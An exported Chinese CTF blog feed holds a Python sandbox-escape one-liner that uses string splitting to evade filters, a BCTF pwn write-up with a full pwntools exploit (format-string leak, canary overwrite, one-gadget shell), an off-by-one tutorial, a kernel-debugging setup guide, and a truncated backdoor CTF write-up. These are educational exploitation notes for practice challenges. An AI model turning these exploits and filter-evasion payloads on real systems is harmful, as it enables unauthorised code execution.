title="0x03"></a>0x03</h4><p>间接引用<br>在不断的dir过程中，发现<strong>closure</strong> 这个object保存了参数，可以引用原生的<strong>import</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> __import__.__getattribute__(<span class="string">&#x27;__clo&#x27;</span>+<span class="string">&#x27;sure__&#x27;</span>)[<span class="number">0</span>].cell_contents(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__getattribute__(<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>)(<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s home&#x27;</span>) </span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/52#toc-10">https://xz.aliyun.com/t/52#toc-10</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> py_sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCTF 里的一个简单Pwn题</title>
      <link href="BCTF-part-pwn.html"/>
      <url>BCTF-part-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://mega.nz/#!XupFhJYb!TOn6FloGkRJs9acQDoes2SO9-8TZ3-9A69qbpnuG0wM">bin 下载链接</a><br>这个题通过覆写fs，改写canary的值</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fs.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/fs.jpg"></a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目保护全开，有三个功能，但仅能使用一次<br> (F)ormat String Bug<br>(A)rbitrary Write<br>(S)tack Overflow<br>(E)xit</p><h3 id="功能-F"><a href="#功能-F" class="headerlink" title="功能 F"></a>功能 F</h3><p>一个格式字符串漏洞，但是用的是printf_chk 所以只能做泄漏</p><h3 id="功能-A"><a href="#功能-A" class="headerlink" title="功能 A"></a>功能 A</h3><p>一个非可控的任意地址写</p><h3 id="功能-S"><a href="#功能-S" class="headerlink" title="功能 S"></a>功能 S</h3><p>栈溢出，但是有00截断</p><h2 id="过程，"><a href="#过程，" class="headerlink" title="过程，"></a>过程，</h2><p>一开始通过 功能F泄漏各种东西，然而到复写canary的时候发现有截断。贼尴尬。后面想起来功能A可以写东西。所以利用功能A去写 fs的canary内容。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bctf-pwn-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bctf-pwn-01.png"></a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># (F)ormat String Bug</span></span><br><span class="line"><span class="comment"># (A)rbitrary Write</span></span><br><span class="line"><span class="comment"># (S)tack Overflow</span></span><br><span class="line"><span class="comment"># (E)xit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fortmat</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arbitrary</span>(<span class="params">payload</span>):</span></span><br><span class="line">io.readuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line"><span class="comment">#break </span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">break *(0x555555554000 + 0xD95)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDD3)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDBB)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xDC7)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xCE1)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xCE6)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC9D)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC10)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC13)</span></span><br><span class="line"><span class="string">  breka *(0x555555554000 + 0xC31)</span></span><br><span class="line"><span class="string">  break *(0x555555554000 + 0xC55)</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bugstore&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">fortmat(<span class="string">&#x27;%p|&#x27;</span>*<span class="number">60</span>)                       <span class="comment">#canary 0x7fffffffde68</span></span><br><span class="line"><span class="comment">#leak </span></span><br><span class="line">leakmsg = str(io.readline()).strip(<span class="string">&#x27;|&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">r8_addr = int(leakmsg[<span class="number">2</span>],<span class="number">16</span>)+<span class="number">0x28</span></span><br><span class="line">canary = int(leakmsg[<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">code_base = int(leakmsg[<span class="number">4</span>],<span class="number">16</span>)<span class="number">-0xdf0</span></span><br><span class="line">libc_base = int(leakmsg[<span class="number">9</span>],<span class="number">16</span>)<span class="number">-243</span>-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;r8 addr :&#123;&#125;&quot;</span>.format(hex(r8_addr)))</span><br><span class="line">log.info(<span class="string">&quot;canary vaule:&#123;&#125;&quot;</span>.format(hex(canary)))</span><br><span class="line">log.info(<span class="string">&quot;code base:&#123;&#125;&quot;</span>.format(hex(code_base)))</span><br><span class="line">log.info(<span class="string">&quot;libc base:&#123;&#125;&quot;</span>.format(hex(libc_base)))</span><br><span class="line"><span class="comment"># some addr</span></span><br><span class="line">pop_rdi_ret = code_base+<span class="number">0x0000000000000e53</span></span><br><span class="line">system_addr = libc_base+system_offset</span><br><span class="line">binsh_addr = libc_base+binsh_offset</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line">arbitrary(str(r8_addr))</span><br><span class="line">raw_input(<span class="string">&#x27;----wait debug ----&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;BUGSTORE&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span>+canary+<span class="string">&quot;B&quot;</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x45556</span>)</span><br><span class="line">stack(payload) </span><br><span class="line">raw_input(<span class="string">&quot;----wait debug -----&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串操作下的Pwn</title>
      <link href="about-some-string-opearting-pwn.html"/>
      <url>about-some-string-opearting-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="什么是字符串"><a href="#什么是字符串" class="headerlink" title="什么是字符串"></a>什么是字符串</h1><p>C风格的字符串是指由一个连续的字符序列组成，并且以一个空字符（null）作为结束。一个指向字符串的指针实际上就是指向该字符串的起始。字符串长度指的是空字符之前的字节数。</p><h1 id="常见操作错误"><a href="#常见操作错误" class="headerlink" title="常见操作错误"></a>常见操作错误</h1><h2 id="无边界字符串复制"><a href="#无边界字符串复制" class="headerlink" title="无边界字符串复制"></a>无边界字符串复制</h2><p> 我们常见的缓冲区溢出一半就会发生在这里。</p><p>无边际字符串复制，实际上是读取数据，复制到一个定长定缓冲区中。如我们常见定栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your Name:\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是常见的无边界字符串复制，gets这个位置是一个很明显的栈溢出点。除了gets ，还有strcpy(),strcat()等等函数。</p><h2 id="差一错误"><a href="#差一错误" class="headerlink" title="差一错误"></a>差一错误</h2><p>其实差一错误，是我们通常所说等off-by-one。。看几个例子：<br>my_gets 函数导致了一个off-by-one漏洞，原因是for循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my_gets 函数导致了一个off-by-one漏洞，原因是for循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误<br>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误(这在 C 语言初学者中很常见)导致多写入了一个字节。</li><li>字符串操作不合适<h2 id="空结尾错误"><a href="#空结尾错误" class="headerlink" title="空结尾错误"></a>空结尾错误</h2>这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>程序乍看上去没有任何问题(不考虑栈溢出)，可能很多人在实际的代码中也是这样写的。 但是 strlen 和 strcpy 的行为不一致却导致了off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>\x00</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>\x00</code>。这就导致了我们向chunk1中写入了25个字节.</li></ul><h1 id="off-one-by-在堆上的利用"><a href="#off-one-by-在堆上的利用" class="headerlink" title="off-one-by 在堆上的利用"></a>off-one-by 在堆上的利用</h1><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于Linux堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上(heap based)的off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>Asis CTF 2016的一道题目，考察点是null byte off-by-one</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目漏洞主要是在create中myread里，read函数可以发现对于边界的考虑是不当的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">myread_9F5</span><span class="params">(_BYTE *ptr_buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = ptr_buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>保护开启状况如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  off-one-by checksec b00ks</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/ctf-wiki/off-one-by/b00ks&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>为了方便调试，我将 系统随机化关闭，那么之后程序基址将保持不变。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> strings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用VMware和GDB进行Linux内核调试</title>
      <link href="Linux_Kernel_Debugging_with_VMware_and_GDB.html"/>
      <url>Linux_Kernel_Debugging_with_VMware_and_GDB.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>之前搭过以qemu+gdb搭内核调试环境，在这次学习<code>Ubuntu 16.04 ebpf arbitrary read/write </code>的分析的时候，换了一个以 VMware 和 GDB的环境进行调试。</p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Host: Mac OS X  , VMware Fusion</p><p>Guest: Ubuntu Linux 14.04 x64</p><h2 id="Step-1-Configure-your-host"><a href="#Step-1-Configure-your-host" class="headerlink" title="Step 1: Configure your host"></a>Step 1: Configure your host</h2><p>第一步当然是要安装VMware 和安装相应内核的linux系统。当我们安装完之后，在虚拟机的目录下找到xxx.vmx文件，添加一行内容。<br><code>debugStub.listen.guest64 = &quot;1&quot;</code> 如果是32位环境，将64进行替换。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-01.jpg"></a></p><h2 id="Step-2-Configure-your-guest"><a href="#Step-2-Configure-your-guest" class="headerlink" title="Step 2: Configure your guest"></a>Step 2: Configure your guest</h2><p>我们首先得编译好相关的内核，关于内核编译的内容就不在这复述，我们需要编译完成的vmlinux文件，这个文件将作为符号信息最终将祭祀给GDB</p><h2 id="Step-3-Build-and-Connect-GDB"><a href="#Step-3-Build-and-Connect-GDB" class="headerlink" title="Step 3: Build and Connect GDB"></a>Step 3: Build and Connect GDB</h2><p>由于mac os环境下的 <code>brew install</code> 的GDB不支持linux相关，所以我们得自己编译一个GDB，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-8.1.tar.gz</span><br><span class="line">tar xf gdb-8.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> gdb-8.1</span><br><span class="line">./configure --build=x86_64-apple-darwin14.0.0 --target=x86_64-vfs-linux --with-python &amp;&amp; make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>通过configure的设置，我们可以编译得到咱们想要的GDB模式。</p><p>mac的话，我们可以在 <code>/usr/local/bin</code>找到我们编译安装后的GDB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># swing @ swingdeMacBook-Pro in &#x2F;usr&#x2F;local&#x2F;bin [17:18:19]</span><br><span class="line">$ find .&#x2F; | grep gdb</span><br><span class="line">.&#x2F;&#x2F;gdb</span><br><span class="line">.&#x2F;&#x2F;gdbus-codegen</span><br><span class="line">.&#x2F;&#x2F;.gdb_history</span><br><span class="line">.&#x2F;&#x2F;x86_64-vfs-linux-gdb</span><br><span class="line">.&#x2F;&#x2F;gdbm_dump</span><br><span class="line">.&#x2F;&#x2F;gdbus</span><br><span class="line">.&#x2F;&#x2F;gdbmtool</span><br><span class="line">.&#x2F;&#x2F;gdbm_load</span><br></pre></td></tr></table></figure><h1 id="Start-Debugging"><a href="#Start-Debugging" class="headerlink" title="Start Debugging"></a>Start Debugging</h1><p>之后，我们只需要运行我们编译后的GDB版本，然后file vmlinux，加载符号信息，然后通过<br><code>target remote :8864</code> ps ：32位替换64即可。<br>这样我们就可以开始咱们的调试之旅了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/linux-kernel-debug-02.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 backdoor CTF</title>
      <link href="2018-backdoor-CTF-Pwn.html"/>
      <url>2018-backdoor-CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="shelter"><a href="#shelter" class="headerlink" title="shelter"></a>shelter</h1><p>简单分析下逻辑和思路，程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/backdoor-ctf/pwn/challenge&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>基本保护全开。程序主要有三个功能，一个 <code>now note</code>，新建chunk</p><p>其逻辑如下<br><a href="/images/2018-backdoor-CTF/2018-03-19-19-12-18.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-12-18.jpg"></a><br><code>delete</code>，删除chunk 逻辑如下</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-13-01.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-13-01.jpg"></a><br>会发现，对函数指针<code>elems</code>进行<code>free</code>后并没有进一步去设置为空。<br><a href="/images/2018-backdoor-CTF/2018-03-19-19-17-10.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-17-10.jpg"></a><br>在delete的过程中，我们发现程序有一条指令为<code>call rdx</code>，进一步调试的过程中我们发现<code>rdx</code>的值为<code>elems</code>有关，所以如果我们可以控制或者伪造一个函数指针，然后去call，就控制了程序的流程<br><code>help</code>，打印help函数的地址，由此我们可以泄漏程序地址</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-14-34.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-14-34.jpg"></a><br>在程序中，我们还发现了后门函数</p><p><a href="/images/2018-backdoor-CTF/2018-03-19-19-15-23.jpg" class="gallery-item"><img src="/images/2018-backdoor-CTF/2018-03-19-19-15-23.jpg"></a>，所以总体思路就是泄漏PIE，伪造指针控制程序流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span 